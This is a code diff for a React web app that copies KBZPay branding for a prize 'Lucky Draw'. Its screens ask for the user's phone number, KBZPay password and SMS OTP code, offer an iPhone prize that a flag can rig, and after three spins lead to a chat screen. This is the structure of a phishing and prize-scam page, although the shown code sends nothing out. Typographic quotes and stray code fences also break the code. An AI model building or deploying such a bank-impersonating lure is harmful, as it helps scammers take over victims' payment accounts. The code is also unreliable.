+      <div style={{textAlign:"center",marginTop:6,color:"rgba(255,255,255,0.3)",fontSize:12}}>ကျန် {spinsLeft} ကြိမ် · ဖိနှိပ်ကာ ကံစမ်းပါ</div>
+    )}
+  </div>
+
+  {/* Contact banner after 3 spins */}
+  {showContact&&<ContactBanner onChat={()=>onChat(history)}/>}
+
+  {/* History */}
+  {history.length>0&&!showContact&&(
+    <div style={{width:"min(82vw,330px)",margin:"8px auto 0",position:"relative",zIndex:5}}>
+      <div style={{color:"rgba(255,255,255,0.3)",fontSize:10,fontWeight:700,letterSpacing:1,marginBottom:5}}>📋 ရလဒ်မှတ်တမ်း</div>
+      <div style={{display:"flex",gap:5,flexWrap:"wrap"}}>
+        {history.map((h,i)=>(
+          <div key={i} style={{padding:"3px 10px",borderRadius:20,background:`${h.color}18`,border:`1px solid ${h.color}40`,color:h.color,fontSize:11,fontWeight:800}}>
+            {h.isSpecial?"📱 iPhone":`${h.display} MMK`}
+          </div>
+        ))}
+      </div>
+    </div>
+  )}
+  <div style={{height:24}}/>
+  {winner&&<ResultPopup prize={winner} onClose={()=>setWinner(null)}/>}
+</div>
+```
+
+);
+}
+
+// ── OTP SCREEN ────────────────────────────────────────────────────────────────
+function OTPScreen({phone,onSuccess,onBack}){
+const [digits,setDigits]=useState([’’,’’,’’,’’,’’,’’]);
+const [err,setErr]=useState(’’);
+const [timer,setTimer]=useState(30);
+const refs=useRef([]);
+
+useEffect(()=>{refs.current[0]?.focus();},[]);
+useEffect(()=>{if(timer<=0)return;const t=setTimeout(()=>setTimer(s=>s-1),1000);return()=>clearTimeout(t);},[timer]);
+
+const set=(idx,val)=>{
+if(!/^\d*$/.test(val))return;
+const next=[…digits];next[idx]=val.slice(-1);setDigits(next);
+if(val&&idx<5)refs.current[idx+1]?.focus();
+};
+const kd=(idx,e)=>{if(e.key===“Backspace”&&!digits[idx]&&idx>0)refs.current[idx-1]?.focus();};
+const confirm=()=>{
+if(digits.join(’’).length<6){setErr(‘OTP ကုဒ် ၆ လုံး ရိုက်ထည့်ပါ’);return;}
+setErr(’’);onSuccess();
+};
+const masked=phone?`${phone.slice(0,3)}****${phone.slice(-3)}`:’’;
+
+return(
+<div style={{minHeight:“100vh”,background:”#000E2A”,display:“flex”,flexDirection:“column”,alignItems:“center”,fontFamily:”‘Segoe UI’,system-ui,sans-serif”}}>
+<div style={{width:“100%”,background:”#005DB8”,padding:“14px 20px”,display:“flex”,alignItems:“center”,gap:12,boxShadow:“0 2px 20px rgba(0,93,184,0.5)”,flexShrink:0}}>
+<button onClick={onBack} style={{background:“rgba(255,255,255,0.18)”,border:“none”,borderRadius:10,width:38,height:38,color:“white”,fontSize:18,cursor:“pointer”,display:“flex”,alignItems:“center”,justifyContent:“center”}}>←</button>
+<div style={{background:“white”,borderRadius:8,padding:“4px 12px”,display:“flex”,alignItems:“center”,gap:1}}>
+<span style={{color:”#005DB8”,fontWeight:900,fontSize:16}}>KBZ</span>
+<span style={{color:”#005DB8”,fontWeight:700,fontSize:12}}> Pay</span>
+</div>
+<span style={{color:“rgba(255,255,255,0.85)”,fontSize:14,fontWeight:600}}>OTP အတည်ပြုခြင်း</span>
+</div>
+
+```
+  <div style={{width:"calc(100% - 40px)",maxWidth:390,marginTop:28,animation:"slideUp 0.4s ease"}}>
+    <div style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:24,padding:"32px 22px",backdropFilter:"blur(20px)"}}>
+      <div style={{textAlign:"center",marginBottom:28}}>
+        <div style={{width:72,height:72,borderRadius:22,background:"linear-gradient(135deg,#005DB8,#0099FF)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 16px",fontSize:32,boxShadow:"0 8px 24px rgba(0,93,184,0.4)"}}>💬</div>
+        <div style={{color:"white",fontSize:18,fontWeight:800,marginBottom:8}}>OTP ကုဒ် ရိုက်ထည့်ပါ</div>
+        <div style={{color:"rgba(255,255,255,0.4)",fontSize:13}}>{masked} သို့ SMS ပေးပို့ပြီးပါပြီ</div>
+      </div>
+
+      <div style={{display:"flex",gap:8,justifyContent:"center",marginBottom:24}}>
+        {digits.map((d,i)=>(
+          <input key={i} ref={el=>refs.current[i]=el} type="tel" inputMode="numeric" maxLength={1} value={d}
+            onChange={e=>set(i,e.target.value)} onKeyDown={e=>kd(i,e)}
+            style={{width:46,height:58,textAlign:"center",fontSize:26,fontWeight:900,background:d?"rgba(0,93,184,0.28)":"rgba(255,255,255,0.05)",border:d?"2px solid #0077E6":"1.5px solid rgba(255,255,255,0.1)",borderRadius:14,color:"white",outline:"none",transition:"all 0.2s",caretColor:"#0077E6",fontFamily:"inherit"}}/>
+        ))}
+      </div>
+
+      {err&&<div style={{background:"rgba(255,45,85,0.12)",border:"1px solid rgba(255,45,85,0.3)",borderRadius:10,padding:"10px 14px",color:"#FF6B8A",fontSize:13,marginBottom:14,textAlign:"center"}}>⚠️ {err}</div>}
+
+      <button onClick={confirm} style={{width:"100%",padding:"16px 0",borderRadius:14,border:"none",background:"linear-gradient(135deg,#005DB8,#0077E6)",color:"white",fontSize:17,fontWeight:900,cursor:"pointer",boxShadow:"0 6px 24px rgba(0,93,184,0.45)",marginBottom:14}}>🔐 ဝင်ရောက်မည်</button>
+
+      <div style={{textAlign:"center"}}>
+        {timer>0?(
+          <span style={{color:"rgba(255,255,255,0.25)",fontSize:12}}>ပြန်ရယူရန် {timer}s</span>
+        ):(
+          <button onClick={()=>setTimer(30)} style={{background:"none",border:"none",color:"#0099FF",fontSize:13,fontWeight:700,cursor:"pointer"}}>🔄 OTP ပြန်ရယူမည်</button>
+        )}
+      </div>
+    </div>
+    <div style={{textAlign:"center",marginTop:10,color:"rgba(255,255,255,0.15)",fontSize:11}}>Demo: ဂဏန်း ၆ လုံး မည်သည်မဆို ရိုက်ထည့်နိုင်သည်</div>
+  </div>
+</div>
+```
+
+);
+}
+
+// ── LOGIN SCREEN ──────────────────────────────────────────────────────────────
+function LoginScreen({onOTP,onBack}){
+const [phone,setPhone]=useState(’’);
+const [pass,setPass]=useState(’’);
+const [show,setShow]=useState(false);
+const [err,setErr]=useState(’’);
+
+const go=()=>{
+if(phone.length<9){setErr(‘ဖုန်းနံပါတ် မှန်ကန်စွာ ထည့်ပါ’);return;}
+if(pass.length<6){setErr(‘Password အနည်းဆုံး ၆ လုံး ဖြည့်ပါ’);return;}
+setErr(’’);onOTP(phone);
+};
+
+return(
+<div style={{minHeight:“100vh”,background:”#000E2A”,display:“flex”,flexDirection:“column”,alignItems:“center”,fontFamily:”‘Segoe UI’,system-ui,sans-serif”}}>
+<div style={{width:“100%”,background:”#005DB8”,padding:“14px 20px”,display:“flex”,alignItems:“center”,gap:12,boxShadow:“0 2px 20px rgba(0,93,184,0.5)”,flexShrink:0}}>
+<button onClick={onBack} style={{background:“rgba(255,255,255,0.18)”,border:“none”,borderRadius:10,width:38,height:38,color:“white”,fontSize:18,cursor:“pointer”,display:“flex”,alignItems:“center”,justifyContent:“center”}}>←</button>
+<div style={{background:“white”,borderRadius:8,padding:“4px 12px”,display:“flex”,alignItems:“center”,gap:1}}>
+<span style={{color:”#005DB8”,fontWeight:900,fontSize:16}}>KBZ</span>
+<span style={{color:”#005DB8”,fontWeight:700,fontSize:12}}> Pay</span>
+</div>
+<span style={{color:“rgba(255,255,255,0.85)”,fontSize:14,fontWeight:600}}>အကောင့်ဝင်ရန်</span>
+</div>
+
+```
+  <div style={{width:"calc(100% - 40px)",maxWidth:390,marginTop:28,animation:"slideUp 0.4s ease"}}>
+    <div style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:24,padding:"30px 22px",backdropFilter:"blur(20px)"}}>
+      <div style={{textAlign:"center",marginBottom:26}}>
+        <div style={{fontSize:48,marginBottom:10}}>👤</div>
+        <div style={{color:"white",fontSize:18,fontWeight:800,marginBottom:4}}>ဝင်ရောက်ပါ</div>
+        <div style={{color:"rgba(255,255,255,0.35)",fontSize:12}}>KBZPay account ဖြင့် Lucky Draw ကစားပါ</div>
+      </div>
+
+      {/* Phone field */}
+      <div style={{marginBottom:14}}>
+        <div style={{color:"rgba(255,255,255,0.5)",fontSize:12,fontWeight:600,marginBottom:7}}>📱 ဖုန်းနံပါတ်</div>
+        <div style={{display:"flex",alignItems:"center",background:"rgba(255,255,255,0.06)",border:"1.5px solid rgba(255,255,255,0.1)",borderRadius:14,overflow:"hidden"}}>
+          <div style={{padding:"14px 12px",color:"rgba(255,255,255,0.45)",fontSize:14,fontWeight:700,borderRight:"1px solid rgba(255,255,255,0.08)",flexShrink:0}}>+95</div>
+          <input type="tel" value={phone} onChange={e=>setPhone(e.target.value.replace(/\D/g,'').slice(0,11))}
+            placeholder="09xxxxxxxxx"
+            style={{flex:1,background:"none",border:"none",outline:"none",color:"white",fontSize:16,padding:"14px 12px",fontFamily:"inherit"}}/>
+        </div>
+      </div>
+
+      {/* Password field */}
+      <div style={{marginBottom:18}}>
+        <div style={{color:"rgba(255,255,255,0.5)",fontSize:12,fontWeight:600,marginBottom:7}}>🔒 Password</div>
+        <div style={{display:"flex",alignItems:"center",background:"rgba(255,255,255,0.06)",border:"1.5px solid rgba(255,255,255,0.1)",borderRadius:14,overflow:"hidden"}}>
+          <input type={show?"text":"password"} value={pass} onChange={e=>setPass(e.target.value)}
+            placeholder="Password ရိုက်ထည့်ပါ"
+            style={{flex:1,background:"none",border:"none",outline:"none",color:"white",fontSize:15,padding:"14px 12px",fontFamily:"inherit"}}/>
+          <button onClick={()=>setShow(!show)} style={{background:"none",border:"none",padding:"0 14px",color:"rgba(255,255,255,0.4)",cursor:"pointer",fontSize:18}}>{show?"🙈":"👁"}</button>
+        </div>
+      </div>
+
+      {err&&<div style={{background:"rgba(255,45,85,0.12)",border:"1px solid rgba(255,45,85,0.3)",borderRadius:10,padding:"10px 14px",color:"#FF6B8A",fontSize:13,marginBottom:14}}>⚠️ {err}</div>}
+
+      <button onClick={go} style={{width:"100%",padding:"16px 0",borderRadius:14,border:"none",background:"linear-gradient(135deg,#005DB8,#0077E6)",color:"white",fontSize:17,fontWeight:900,cursor:"pointer",boxShadow:"0 6px 24px rgba(0,93,184,0.45)"}}>
+        OTP ကုဒ် ရယူပါ →
+      </button>
+      <div style={{textAlign:"center",marginTop:10,color:"rgba(255,255,255,0.2)",fontSize:11}}>ဖုန်းနံပါတ်ထဲ OTP SMS ပို့ပေးမည်</div>
+    </div>
+  </div>
+</div>
+```
+
+);
+}
+
+// ── SPLASH / HOME SCREEN ──────────────────────────────────────────────────────
+function HomeScreen({onLogin}){
+return(
+<div style={{minHeight:“100vh”,background:“linear-gradient(180deg,#000E2A 0%,#001840 50%,#000E2A 100%)”,display:“flex”,flexDirection:“column”,alignItems:“center”,justifyContent:“center”,fontFamily:”‘Segoe UI’,system-ui,sans-serif”,position:“relative”,overflow:“hidden”}}>
+{/* Background glow */}
+<div style={{position:“absolute”,top:“30%”,left:“50%”,transform:“translate(-50%,-50%)”,width:300,height:300,borderRadius:“50%”,background:“radial-gradient(circle,rgba(0,93,184,0.2) 0%,transparent 70%)”,pointerEvents:“none”}}/>
+
+```
+  {/* Stars */}
+  {Array.from({length:35},(_,i)=>(
+    <div key={i} style={{position:"absolute",left:`${(i*19+5)%100}%`,top:`${(i*11+8)%100}%`,width:i%5===0?3:1.5,height:i%5===0?3:1.5,borderRadius:"50%",background:"white",animation:`twinkle ${1.5+(i%5)*0.4}s ${(i%6)*0.3}s ease-in-out infinite`,pointerEvents:"none"}}/>
+  ))}
+
+  {/* KBZ Pay Logo */}
+  <div style={{animation:"slideUp 0.5s ease",display:"flex",flexDirection:"column",alignItems:"center",gap:0}}>
+    {/* Big logo card */}
+    <div style={{
+      width:130,height:130,borderRadius:34,
+      background:"white",
+      display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",
+      boxShadow:"0 20px 60px rgba(0,93,184,0.5),0 0 80px rgba(0,119,230,0.2)",
+      marginBottom:22,
+      animation:"kpayPulse 2.5s ease-in-out infinite",
+    }}>
+      <div style={{fontSize:58,fontWeight:900,color:"#005DB8",lineHeight:1,letterSpacing:-2}}>KBZ</div>
+      <div style={{fontSize:22,fontWeight:700,color:"#005DB8",letterSpacing:3,marginTop:-2}}>Pay</div>
+    </div>
+
+    <div style={{color:"white",fontSize:26,fontWeight:900,letterSpacing:-0.5,marginBottom:6}}>KBZPay</div>
+    <div style={{
+      fontSize:15,fontWeight:600,
+      background:"linear-gradient(90deg,#FFE566,#FFD700,#FF8C00)",
+      WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent",backgroundClip:"text",
+      marginBottom:6,
+    }}>Lucky Draw 🎰 ကံစမ်းပွဲ</div>
+    <div style={{color:"rgba(255,255,255,0.3)",fontSize:12,marginBottom:40}}>
+      Spin & Win · iPhone 17 Pro Max ဆုကြီး
+    </div>
+
+    {/* Login button */}
+    <button onClick={onLogin} style={{
+      width:240,padding:"17px 0",borderRadius:20,border:"none",
+      background:"linear-gradient(135deg,#005DB8 0%,#0077E6 50%,#0099FF 100%)",
+      color:"white",fontSize:17,fontWeight:900,cursor:"pointer",
+      boxShadow:"0 8px 28px rgba(0,93,184,0.55)",
+      display:"flex",alignItems:"center",justifyContent:"center",gap:10,
+      animation:"kpayPulse 2s ease-in-out infinite",
+      letterSpacing:0.3,
+    }}>
+      <span style={{fontSize:20}}>🔐</span> ဝင်ရောက်ပါ
+    </button>
+
+    <div style={{marginTop:14,color:"rgba(255,255,255,0.2)",fontSize:12}}>
+      KBZPay account ဖြင့် ဝင်ရောက်ပါ
+    </div>
+  </div>
+
+  {/* Bottom prize chips */}
+  <div style={{position:"absolute",bottom:28,left:0,right:0,display:"flex",gap:5,flexWrap:"wrap",justifyContent:"center",padding:"0 20px"}}>
+    {PRIZES.map(p=>(
+      <div key={p.id} style={{padding:"3px 9px",borderRadius:20,background:`${p.color}15`,border:`1px solid ${p.color}45`,color:p.color,fontSize:10,fontWeight:800}}>
+        {p.isSpecial?"📱 iPhone":p.display}
+      </div>
+    ))}
+  </div>
+</div>
+```
+
+);
+}
+
+// ── GLOBAL CSS ─────────────────────────────────────────────────────────────────
+const CSS=`*{box-sizing:border-box;margin:0;padding:0;} body{font-family:'Segoe UI',system-ui,sans-serif;background:#000E2A;} input,textarea{font-family:'Segoe UI',system-ui,sans-serif;} textarea{overflow:auto;} ::-webkit-scrollbar{width:4px;height:4px;} ::-webkit-scrollbar-track{background:rgba(255,255,255,0.03);} ::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.1);border-radius:4px;} @keyframes fdIn{from{opacity:0}to{opacity:1}} @keyframes popUp{from{transform:scale(.5) translateY(30px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}} @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,.7),0 8px 30px rgba(255,140,0,.5)}60%{box-shadow:0 0 0 18px rgba(255,215,0,0),0 8px 30px rgba(255,140,0,.5)}} @keyframes kpayPulse{0%,100%{box-shadow:0 8px 30px rgba(0,93,184,0.5)}50%{box-shadow:0 8px 40px rgba(0,93,184,0.9),0 0 60px rgba(0,119,230,0.3)}} @keyframes spinRing{from{transform:rotate(0deg)}to{transform:rotate(360deg)}} @keyframes twinkle{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:.9;transform:scale(1.3)}} @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-7px)}} @keyframes slideUp{from{transform:translateY(28px);opacity:0}to{transform:translateY(0);opacity:1}} @keyframes typeDot{0%,80%,100%{transform:translateY(0);opacity:.4}40%{transform:translateY(-5px);opacity:1}}`;
+
+// ── ROOT APP ──────────────────────────────────────────────────────────────────
+export default function App(){
+const [screen,setScreen]=useState(‘home’);
+const [phone,setPhone]=useState(’’);
+const [winHistory,setWinHistory]=useState([]);
+
+const iphoneMode=false; // set to true to force iPhone prize
+
+return(
+<>
+<style>{CSS}</style>
+{screen===‘home’   && <HomeScreen  onLogin={()=>setScreen(‘login’)}/>}
+{screen===‘login’  && <LoginScreen onOTP={ph=>{setPhone(ph);setScreen(‘otp’);}} onBack={()=>setScreen(‘home’)}/>}
+{screen===‘otp’    && <OTPScreen   phone={phone} onSuccess={()=>setScreen(‘spin’)} onBack={()=>setScreen(‘login’)}/>}
+{screen===‘spin’   && <SpinScreen  iphoneMode={iphoneMode} onChat={hist=>{setWinHistory(hist);setScreen(‘chat’);}}/>}
+{screen===‘chat’   && <ChatScreen  winHistory={winHistory} onBack={()=>setScreen(‘spin’)}/>}
+</>
+);
+}
